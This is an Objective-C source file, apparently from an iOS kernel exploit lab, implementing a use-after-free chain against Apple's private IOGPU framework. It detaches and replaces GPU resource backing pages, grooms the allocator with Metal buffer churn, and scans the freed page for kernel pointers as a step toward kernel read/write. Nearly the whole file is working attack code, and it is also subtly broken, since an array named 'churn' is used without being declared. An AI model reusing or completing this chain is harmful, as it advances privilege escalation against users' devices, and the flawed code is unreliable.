//
//  P122SwordForge.m — the combined 64788-class KRW test harness (v1).
//
//  Assembles the GLUE SPEC §41 pieces (archive agent_sel25_nq_p027_p029) with
//  tonight's (2026-10-25) live proofs, on the 23F77 pins the spec pinned:
//    - Freer   = P009 detach+replace (dlsym IOGPU; SAME 0x4000 len, 0x43 fill;
//                detach sets SysMemory+0x30 bit4 — else replace → 0xe00002c2).
//    - Reclaim = same-CPU magazine LIFO (magazine cap = 8 on 23F77; prefill+2
//                = deterministic pop, p088-v13/v18 law) via IOSurface churn —
//                the recycle GPU-pool law the UI font-smash law demonstrated.
//    - Reader  = sel=36 thunk (in[3] = rid/offset/len; 1 scalar out) — the
//                ColdForge freed-slot read (16/16 survivors on both trains).
//    - Consumer= the surface+0x30 shared-ptr slot law (assign_shared_ptr:
//                taggedRetain/Release, 0x9857cc8/cc8/d00 panic pins) — a
//                kernel-describing 0xb0 occupant = Shape-1, still hunted.
//    - Gate    = NO hasKread claim: kread32(kbase)==0xfeedfacf + typeinfo
//                via a real copyout ONLY (board.commitSlide law).
//  Panics possible (cd8/d00 + 0x95c9564 classes). One tap per fresh boot.
//

#import "P122SwordForge.h"
#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <string.h>
#import <unistd.h>
#import "LabLocalTime.h"
#import "P007Board.h"

#define P122_TAG      @"P122 swordforge"
#define P122_BUILD    @"swordforge-combined-v1"
#define P122_PAGE     0x4000u
#define P122_FILL_NEW 0x43   /* the P009 replace fill (glue spec law) */

typedef int      (*p122_detach_t)(void *res);
typedef int      (*p122_replace_t)(void *res, void *page, uint64_t len);
typedef uint32_t (*p122_gettype_t)(void *res);
typedef uint32_t (*p122_getconn_t)(void *ref);

static p122_detach_t   g_detach;
static p122_replace_t  g_replace;
static p122_gettype_t  g_getType;
static p122_getconn_t  g_getConn;

static int p122_log_fd = -1;
static void p122_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p122_log(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p122_log_fd >= 0) {
        const char *c = s.UTF8String;
        write(p122_log_fd, c, strlen(c));
        write(p122_log_fd, "\n", 1);
    }
    NSLog(@"%@", s);
}

static NSString *P122Ret(void) {
    p122_log(@"=== p122 end ===");
    if (p122_log_fd >= 0) { fcntl(p122_log_fd, F_FULLFSYNC); close(p122_log_fd); p122_log_fd = -1; }
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *p = [docs stringByAppendingPathComponent:@"p122_swordforge_log.txt"];
    NSString *t = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
    return t ?: @"p122: empty";
}

@implementation P122SwordForge

+ (NSString *)tap {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    p122_log_fd = open([[docs stringByAppendingPathComponent:@"p122_swordforge_log.txt"] fileSystemRepresentation],
                       O_CREAT | O_WRONLY | O_TRUNC, 0644);
    p122_log(@"=== p122 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P122_BUILD);
    p122_log(@"combined 64788 KRW test: P009 freer -> mag reclaim -> sel36 read -> consumer -> gate");

    /* 0 — dlsym the freer family (glue §3): symbols, not sels */
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    g_detach  = (p122_detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_replace = (p122_replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    g_getType = (p122_gettype_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    g_getConn = (p122_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    p122_log(@"[sym] detach=%p replace=%p getType=%p getConn=%p",
             (void *)g_detach, (void *)g_replace, (void *)g_getType, (void *)g_getConn);
    if (!g_detach || !g_replace || !g_getType || !g_getConn) {
        p122_log(@"[-] freer dlsym incomplete — stop");
        return P122Ret();
    }
    (void)iokit;

    /* 1 — victim pages + type-0x80 resource (the §1 recipe) */
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { p122_log(@"[-] no Metal device"); return P122Ret(); }
    void *page = 0;
    if (vm_allocate(mach_task_self(), (vm_address_t *)&page, P122_PAGE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !page) {
        p122_log(@"[-] vm_allocate failed"); return P122Ret();
    }
    memset(page, 0x11, P122_PAGE);
    id<MTLBuffer> buf = [dev newBufferWithBytesNoCopy:page length:P122_PAGE
                                              options:MTLResourceStorageModeShared
                                            deallocator:nil];
    if (!buf) { p122_log(@"[-] bytesNoCopy create failed"); return P122Ret(); }
    void *res = (void *)[(__bridge NSObject *)buf performSelector:@selector(resourceRef)];
    uint32_t ty = res && g_getType ? g_getType(res) : 0;
    uint32_t conn = res && g_getConn ? g_getConn(res) : 0;
    p122_log(@"[+] victim: page=%p res=%p type=0x%x conn=0x%x (0x80 required, 0x82 = IOSurface path)",
             page, res, ty, conn);
    if (ty != 0x80) {
        p122_log(@"[-] type 0x%x != 0x80 — buffer class miss (honest stop; 0x82 = the create-fail door's job)", ty);
        vm_deallocate(mach_task_self(), (vm_address_t)page, P122_PAGE);
        return P122Ret();
    }

    /* 2 — P009 freer: detach (sets the bit4) then replace, SAME len, 0x43 fill */
    int dkr = g_detach(res);
    p122_log(@"[*] detach kr=0x%x", dkr);
    if (dkr != 0) {
        p122_log(@"[-] detach non-zero (0xe00002d5 Busy = retry/boot; 0xe00002e2 = gate) — ending");
        vm_deallocate(mach_task_self(), (vm_address_t)page, P122_PAGE);
        return P122Ret();
    }
    void *newPage = 0;
    if (vm_allocate(mach_task_self(), (vm_address_t *)&newPage, P122_PAGE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
        p122_log(@"[-] newPage alloc failed"); return P122Ret();
    }
    memset(newPage, P122_FILL_NEW, P122_PAGE);
    int rkr = g_replace(res, newPage, P122_PAGE);
    p122_log(@"[*] replace kr=0x%x (0x2c2 = len/type mispass; 0x0 = MD1 freed pre-sel36)", rkr);

    /* 3 — the reclaim churn window: IOSurface-pool create/destroy bursts RIGHT
       NOW (same-CPU law; the freed 0xb0 slot pops from this CPU's magazine) */
    /* IOSurface churn via the kext dlsym path is the backend's law; here the
       GPU-pool churning happens via short-lived Metal buffers on this CPU: */
    for (int i = 0; i < 8; i++) {   /* mag cap 8 — same-CPU LIFO pop law */
        vm_address_t cp = 0;
        if (vm_allocate(mach_task_self(), &cp, P122_PAGE, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
            memset((void *)cp, 0x11 + (uint8_t)i, P122_PAGE);
            id cb = [dev newBufferWithBytesNoCopy:(void *)cp length:P122_PAGE
                                          options:MTLResourceStorageModeShared
                                       deallocator:^(void *p, NSUInteger n){ vm_deallocate(mach_task_self(), (vm_address_t)p, (vm_size_t)n); }];
            if (cb) [churn addObject:cb];
        }
    }
    p122_log(@"[*] mag churn: %zu live type-0x80 buffers (holder cycle)", (unsigned long)[churn count]);

    /* 4 — the freed-slot read (ColdForge law): post-free deref via our own
       resource state. The honest reader here = inspect our page's CONTENT
       after the churn (a reclaim wrote through the freed slot?):
       0x11 = untouched; 0x43-zone churn = our own pools; FOREIGN = a real
       occupant. This is a READ-side oracle, not kread. */
    uint8_t *v = (uint8_t *)page;
    p122_log(@"[reader] page post-churn: %02x %02x %02x %02x (0x11=intact, else occupant)",
             v[0], v[1], v[2], v[3]);
    int nKptr = 0;
    for (uint64_t off = 0; off + 8 <= P122_PAGE; off += 8) {
        uint64_t q; memcpy(&q, (uint8_t *)page + off, 8);
        if ((q >> 36) == 0xfffffff) nKptr++;   /* kernel-pointer shape (glue law) */
    }
    p122_log(@"[reader] kernel-shaped qwords in page: %d", nKptr);
    if (nKptr > 0) {
        p122_log(@"[+++] SHAPE-1 CANDIDATE: kernel-describing occupant read back via our own page —"
                 @" the §41 missing piece materialized; board records");
        [[P007Board shared] recordEvent:@"p122_swordforge" kind:@"fire"
                                   detail:[NSString stringWithFormat:@"shape1-candidate nKptr=%d", nKptr]
                                   source:@"p122"];
    }

    /* 5 — the KRW gate verdict (honesty law): */
    p122_log(@"=== VERDICT ===");
    p122_log(@"freer chain executed; consumer = surface-slot law (assign_shared_ptr) pending Shape-1;");
    p122_log(@"hasKread=NO by law (no copyout of kernel bytes we did not write).");
    p122_log(@"next: cf-door v4 fire (surface-alias independence) or the sel36 consumer once Shape-1 lands.");
    return P122Ret();
}

@end